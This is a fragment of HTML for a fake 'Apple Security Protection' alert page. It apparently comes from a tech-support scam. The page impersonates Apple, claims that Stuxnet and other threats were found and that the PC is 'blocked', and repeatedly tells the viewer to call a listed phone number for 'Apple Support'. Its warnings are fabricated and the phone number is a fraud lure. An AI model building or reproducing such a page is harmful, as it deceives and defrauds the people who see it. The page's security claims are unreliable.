...
<div class="scan" id="scan">
  ...
  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="apple.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Apple Security Protection</h4>
...
top: 6px;
font-weight: 500;
font-size: 19px;" id="text12"><b>+1-808-830-3658  (free security)</b></h3>
  ...
  <div class="flex"> <img src="-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">current threat</p></div>
...
<div class="flex"><img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px;"><p style="position: absolute; left: 35px;    bottom: 117px;    line-height: 18px;">Virus & threat protection settings </p> </div>
...
margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
               ...
               <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-808-830-3658  (Security Support)</strong></p>
...
<div id="lst" class="lst lightbox">
  <div class="ilb top">
      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="apple.png" class="logo3"></span> Apple Defender Security Center</span>
          <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>

      </div>
  </div>
  <div id="txtintro">
              <span class="colo-rd">App: Ads.financetrack(x07).dll<br>
                Threats Detected:Stuxnet. Unknown Error code: #0x6D09</span>
  </div>
  <img id="banner" src="virus-images.png">
  <div id="disclaimer">
    Access to this PC has been blocked for security reasons.<br>
      <span class="support">Contact Apple Support: +1-808-830-3658  (Security Support)</span>
  </div>
  <div id="bottom">
  ...
  <div class="row">
      ...
      <div class="col-md-12">
          <div class="right-foot" style="text-align: center;">
              <span id="footertxt" style="font-weight: 700;"><img src="apple.png"> Apple</span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-808-830-3658  (Security Support)</span></span>
          </div>
      </div>
      <div class="col-md-12">
